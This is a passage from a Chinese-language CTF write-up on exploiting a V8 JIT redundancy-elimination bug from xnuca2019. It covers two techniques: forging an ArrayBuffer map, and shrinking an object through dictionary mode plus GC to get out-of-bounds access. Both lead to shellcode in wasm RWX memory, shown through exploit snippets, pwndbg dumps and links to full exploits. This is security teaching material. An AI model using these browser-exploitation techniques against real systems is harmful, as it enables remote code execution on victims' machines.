$1 = 2.8757499612354866e-188
pwndbg&gt; p `{`double`}` 0x55fbd984380
$2 = 6.7349004654127717e-316
pwndbg&gt;
```

需要注意的是伪造的map对象在后面的操作过程中由于触发GC，会被移动到`old space`中，若是采用前面提到的数组形式来存放数据，在移动之后JSArray对象的`elements`字段与该对象起始地址的偏移是不固定的，这使得我们的漏洞利用具有不稳定性，所以用什么方法可以让对象起始地址和数据之间的偏移固定呢？可以利用对象的属性信息来存储我们的`fake map`数据，我们知道对象内属性是直接存放在对象内部的，其相对于对象起始地址偏移固定为0x18。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a189db319bb436d5.png)

所以最后存放`fake map`可以用这种形式：

```
// fake arraybuffer map
    let fake_ab_map = `{`x1:-1.1263976280432204e+129,x2:2.8757499612354866e-188,x3:6.7349004654127717e-316,x4:-1.1263976280432204e+129,x5:-1.1263976280432204e+129,x6:0.0`}`;
    fake_ab_map.x4 = mem.u2d(ab_proto_addr);
    fake_ab_map.x5 = mem.u2d(ab_construct_addr);
```

### <a class="reference-link" name="%E4%BC%AA%E9%80%A0ArrayBuffer"></a>伪造ArrayBuffer

伪造出`ArrayBuffer map`之后，伪造一个`ArrayBuffer`便比较简单了，只需要按照下面这种形式来伪造即可，前面的三个字段只需要用我们`fake map`的地址来填写即可，后面的是`ArrayBuffer`的length和backing store。

```
var fake_ab = [
    mem.u2d(ab_map_obj_addr), //我们fake的map地址
    mem.u2d(ab_map_obj_addr), //写死即可，这个数字应该无所谓
    mem.u2d(ab_map_obj_addr), //写死即可，这个数字应该无所谓
    3.4766779039175e-310, /* buffer length 0x4000*/
    3.477098183419809e-308,//backing store,先随便填一个数
    mem.u2d(0x8)
];
```

这里需要注意最后一个字段，在`34c3ctf v9`里面用`mem.u2d(4)`可以的，但是在这里它会报如下错误：

```
TypeError: Cannot perform DataView.prototype.getFloat64 on a detached ArrayBuffer
    at DataView.getFloat64 (&lt;anonymous&gt;)

```

依据这个错误，翻了一下源码，发现通过`IsDetachedBuffer`来判断一个buffer是否是`Detached`，判断的方式就是`LoadJSArrayBufferBitField`加载JSArrayBuffer的`bit_filed`，`bit_filed`刚好就是我们`fake_ab`的最后一个字段，所以我尝试把它从0x4改成0x8，结果就没有报错了。

最后伪造的ArrayBuffer数据可以是这样：

```
let fake_ab = `{`y1:mem.u2d(fake_ab_map_addr),y2:mem.u2d(fake_ab_map_addr),y3:mem.u2d(fake_ab_map_addr),y4:mem.u2d(0x2000000000),y5:mem.u2d(fake_ab_map_addr+0x20),y6:mem.u2d(0x8)`}`;
    gc();
```

### <a class="reference-link" name="getshell"></a>getshell

有了伪造的ArrayBuffer，再结合DataView，通过不断地修改`backing_store`也既`fake_ab.y5`即可实现任意地址读写。按照`wasm func addr(offset:0x18)`-&gt;`SharedFunctionInfo(offset:0x8)`-&gt;`WasmExportedFunctionData(offset:0x10)`-&gt;`data_instance(offset:0xc8)`-&gt;`imported_function_targets(offset:0)`-&gt;`rwx addr`的顺序获取rwx的地址，写入shellcode即可。

[完整exp在这里](https://github.com/e3pem/CTF/blob/master/xnuca2019_jit/exp1.js)



## 漏洞利用 – Shrink object

### <a class="reference-link" name="%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"></a>基础知识

该漏洞利用技巧是从mem2019师傅[34C3 CTF V9](https://mem2019.github.io/jekyll/update/2019/08/28/V8-Redundancy-Elimination.html)中学到的，从前面的分析我们知道了对象内(in-object)属性的存储方式，这种方式存储的是对象初始化时就有的属性，也就是我们所说的快速属性，然而还有一种存储属性的模式，就是`dictionary mode`。在字典模式中属性的存储不同于`fast mode`，不是直接存放在距离对象偏移为0x18的位置处，而是重新开辟了一块空间来存放。

我们用下面这个例子来实际分析一下：

```
function gc() `{` 
    for (var i = 0; i &lt; 1024 * 1024 * 16; i++)`{`
        new String();
    `}`
`}`
let obj = `{`a:1.1,b:1.2,c:1.3,d:1.4,e:1.5`}`;
%DebugPrint(obj);
readline();
delete obj['d'];
%DebugPrint(obj);
readline();
gc();
%DebugPrint(obj);
readline();
```

最开始obj对象有5个`in-object`属性，其直接存放在对象内部，相对于对象起始地址的偏移为0x18：

```
pwndbg&gt; job 0x758ca28fa29
0x758ca28fa29: [JS_OBJECT_TYPE]
 - map: 0x23d4daa0cd91 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x332bb06046d9 &lt;Object map = 0x23d4daa022f1&gt;
 - elements: 0x0f84c5302cf1 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
 - properties: 0x0f84c5302cf1 &lt;FixedArray[0]&gt; `{`
    #a: &lt;unboxed double&gt; 1.1 (data field 0)
    #b: &lt;unboxed double&gt; 1.2 (data field 1)
    #c: &lt;unboxed double&gt; 1.3 (data field 2)
    #d: &lt;unboxed double&gt; 1.4 (data field 3)
    #e: &lt;unboxed double&gt; 1.5 (data field 4)
 `}`
pwndbg&gt; x/10xg 0x758ca28fa28
0x758ca28fa28:  0x000023d4daa0cd91      0x00000f84c5302cf1
0x758ca28fa38:  0x00000f84c5302cf1      0x3ff199999999999a &lt;==1.1
0x758ca28fa48:  0x3ff3333333333333      0x3ff4cccccccccccd
0x758ca28fa58:  0x3ff6666666666666      0x3ff8000000000000
0x758ca28fa68:  0x00000f84c5302341      0x0000000500000000
```

接下来我们进行了`delete obj['d']`操作，删除对象属性的操作将会把对象转换为`dictionary mode`，转换后对象确实变成了`dinctionary mode`，我们再看原来对象的内存数据，发现原来存放属性的地方值已经发生变化了，使用job命令查看偏移为0x18位置处，显示`free space, size 40`。

```
pwndbg&gt; job 0x758ca28fa29
0x758ca28fa29: [JS_OBJECT_TYPE]
 - map: 0x23d4daa081f1 &lt;Map(HOLEY_ELEMENTS)&gt; [DictionaryProperties]
 - prototype: 0x332bb06046d9 &lt;Object map = 0x23d4daa022f1&gt;
 - elements: 0x0f84c5302cf1 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
 - properties: 0x0758ca28fc71 &lt;NameDictionary[53]&gt; `{`
   #a: 0x0758ca28fe29 &lt;HeapNumber 1.1&gt; (data, dict_index: 1, attrs: [WEC])
   #e: 0x0758ca28fe69 &lt;HeapNumber 1.5&gt; (data, dict_index: 5, attrs: [WEC])
   #c: 0x0758ca28fe49 &lt;HeapNumber 1.3&gt; (data, dict_index: 3, attrs: [WEC])
   #b: 0x0758ca28fe39 &lt;HeapNumber 1.2&gt; (data, dict_index: 2, attrs: [WEC])
 `}`
pwndbg&gt; x/10xg 0x758ca28fa28
0x758ca28fa28:  0x000023d4daa081f1      0x00000758ca28fc71
0x758ca28fa38:  0x00000f84c5302cf1      0x00000f84c5302201
0x758ca28fa48:  0x0000002800000000      0x3ff4cccccccccccd
0x758ca28fa58:  0x3ff6666666666666      0x3ff8000000000000
0x758ca28fa68:  0x00000f84c5302341      0x0000000500000000
pwndbg&gt; job 0x758ca28fa41
free space, size 40
pwndbg&gt;
```

接下来调用gc函数，触发GC，对象obj由于在多次内存访问期间都存在，所以会被移至`old space`，此时查看相对于obj偏移为0x18处的值，已经不是原来存放的`in-object`属性了，而是其他的一些被移动到`old space`的对象。

```
pwndbg&gt; job 0x2a376d0856f1
0x2a376d0856f1: [JS_OBJECT_TYPE] in OldSpace
 - map: 0x23d4daa081f1 &lt;Map(HOLEY_ELEMENTS)&gt; [DictionaryProperties]
 - prototype: 0x332bb06046d9 &lt;Object map = 0x23d4daa022f1&gt;
 - elements: 0x0f84c5302cf1 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
 - properties: 0x2a376d08ddd1 &lt;NameDictionary[53]&gt; `{`
   #a: 0x2a376d08e0e1 &lt;HeapNumber 1.1&gt; (data, dict_index: 1, attrs: [WEC])
   #e: 0x2a376d08e0f1 &lt;HeapNumber 1.5&gt; (data, dict_index: 5, attrs: [WEC])
   #c: 0x2a376d08e101 &lt;HeapNumber 1.3&gt; (data, dict_index: 3, attrs: [WEC])
   #b: 0x2a376d08e111 &lt;HeapNumber 1.2&gt; (data, dict_index: 2, attrs: [WEC])
 `}`
pwndbg&gt; x/10xg 0x2a376d0856f0
0x2a376d0856f0: 0x000023d4daa081f1      0x00002a376d08ddd1
0x2a376d085700: 0x00000f84c5302cf1      0x000023d4daa0cbb1
0x2a376d085710: 0x00000f84c5302cf1      0x00000f84c5302cf1
0x2a376d085720: 0x00002a376d08dcb9      0x00002a376d08dcf9
0x2a376d085730: 0x00002a376d08dd41      0x00002a376d08dd89
pwndbg&gt; job 0x2a376d085709
0x2a376d085709: [JS_OBJECT_TYPE] in OldSpace
 - map: 0x23d4daa0cbb1 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x2a376d082291 &lt;Memory map = 0x23d4daa0cb11&gt;
 - elements: 0x0f84c5302cf1 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
 - properties: 0x0f84c5302cf1 &lt;FixedArray[0]&gt; `{`
    #buf: 0x2a376d08dcb9 &lt;ArrayBuffer map = 0x23d4daa04371&gt; (data field 0)
    #f64: 0x2a376d08dcf9 &lt;Float64Array map = 0x23d4daa04551&gt; (data field 1)
    #u32: 0x2a376d08dd41 &lt;Uint32Array map = 0x23d4daa04191&gt; (data field 2)
    #bytes: 0x2a376d08dd89 &lt;Uint8Array map = 0x23d4daa02b11&gt; (data field 3)
 `}`
```

### <a class="reference-link" name="%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8"></a>实际利用

现在回到这道题上，前面已经知道通过一些操作让对象属性从`fast mode`变成`dictionary mode`，在通过多次内存操作触发GC，我们的对象将被移至`old space`，此时原来存放`in-object`属性的偏移0x18处起始的地方存放的是其他被移动到`old space`的对象，相当于对象已经发生了`变化`，由于漏洞的存在，`CheckMaps`节点被消除，无法检测出对象的改变，仍然按照原来访问`in-object`的方式来读写对象数据，此时读写的就是其他对象中的数据了，也既越界读写。

将对象从`fast mode`转化为`dictionary mode`的方式目前知道的是：
- victim**obj.<em>_defineGetter**</em>(‘xx’,()=&gt;2);
- delete victim_obj[‘d’];
如果紧跟着obj后面的是我们申请的一个`JSArray`，那么越界修改数组的length字段是可以做到的，由此我们可以得到一个很大的数组越界，后续的利用就很简单了，查找Arraybuffer的`backing_store`相对于越界数组的下标便可做到任意地址读写。

现在的问题是如何让两个对象在移动至`old space`之后还能紧挨着呢？经过多次尝试发现，在trigger_vul中会有对`victim_obj`的访问，若是我在`foo4vul`中不加入对`arr`的访问，那么这两个对象移动后相差的距离一定会很大，所以我猜测由于存在对`victim_obj`的访问，所以它会先被移动到`old space`，后续的arr虽然也会移动，但是这之间已经有多个对象移动到`old space`了，因此导致二者的偏移很大。而在`foo4vul`中加入`arr`的访问，果然两个对象的地址是紧挨着的，而且非常稳定！

**还有一个小问题：之前遇到了移动后`victim_obj`位于`arr`后面的情况，调换了一下`foo4vul`的参数顺序`a,b,o,arr-&gt;a,b,arr,o`即可。**

拿到越界数组的部分代码如下：

```
let victim_obj = `{`x:1,y:2,z:3,l:4,a:5,b:6,c:7,d:8,e:9`}`;
    let arr = [1.1,1.2,1.3,1.4,1.5,1.6];
    var OPT_NUM = 0x10000;

    function foo4vul(a,b,arr,o)`{`
        for(let i=0;i&lt;OPT_NUM;++i)`{``}`
        let ret = o.x+arr[4];
        a&amp;b;
        o.l = 0x667788;
        return ret;
    `}`

    // trigger vul to get an OOB Array
    function trigger_vul()`{`
        let b0 = `{`
            valueOf: function()`{`
                return 22223333;
            `}`
        `}`
        let b = `{`
            valueOf: function()`{`
                victim_obj.__defineGetter__('xx',()=&gt;2);
                victim_obj.__defineGetter__('xx',()=&gt;2);
                for (var i = 0; i &lt; 1024 * 1024 * 16; i++)`{`
                    new String();
                `}`
                return 888888889999;
            `}`
        `}`
        let arr_t = [1.1,1.2,1.3,1.4,1.5,1.6];
        foo4vul(12345,b0,arr_t,`{`x:1,y:2,z:3,l:4,a:5,b:6,c:7,d:8,e:9`}`);
        foo4vul(12345,b0,arr_t,`{`x:1,y:2,z:3,l:4,a:5,b:6,c:7,d:8,e:9`}`);
        foo4vul(12345,b,arr,victim_obj);
    `}`

    trigger_vul();
```

后续只需要在申请一个ArrayBuffer、marker，让它也移动到`old space`，依据特征查找处偏移即可做到任意地址读写，仍然按照上一种利用思路中获取wasm的rwx地址的方式，写入shellcode即可。

```
// 0xdead and 0xbeef is special
    marker = `{`a:0xdead,b:0xbeef,c:f`}`;
    // 0x222 is special
    ab = new ArrayBuffer(0x222);
    gc();
```

[完整exp在这里](https://github.com/e3pem/CTF/blob/master/xnuca2019_jit/exp2.js)

利用效果：

[![](https://p5.ssl.qhimg.com/t01c96b6e265a4b1ce5.png)](https://p5.ssl.qhimg.com/t01c96b6e265a4b1ce5.png)



## 总结

我们通过对源码的分析结合其他题目的利用方式先找到了漏洞的触发方式，然后再从源码的角度详细的跟踪了触发漏洞的回调函数具体调用路径，并且以此找到了3中定义回调函数的方式，分别是：定义toPrimitive属性；定义valueOf；定义toString。利用该漏洞可以造成类型混淆，然后介绍了两种利用方式来对这道题进行利用，分别是：伪造`ArrayBuffer map`，进一步伪造可用于任意地址读写的`ArrayBuffer`；将对象从`fast mode`转变成`dictionary mode`，然后移至`old space`，此时对象会发生收缩，但优化代码仍然会按照原来的方式读写对象的属性，也既越界读写其他对象的内容，构造合适的内存排布，越界写`JSArray`对象的length字段来构造OOB，进而实现任意地址读写。



## 参考

[http://p4nda.top/2019/06/11/%C2%96CVE-2018-17463/](http://p4nda.top/2019/06/11/%C2%96CVE-2018-17463/)

[https://mem2019.github.io/jekyll/update/2019/08/28/V8-Redundancy-Elimination.html](https://mem2019.github.io/jekyll/update/2019/08/28/V8-Redundancy-Elimination.html)

[http://eternalsakura13.com/2019/04/29/v9/](http://eternalsakura13.com/2019/04/29/v9/)
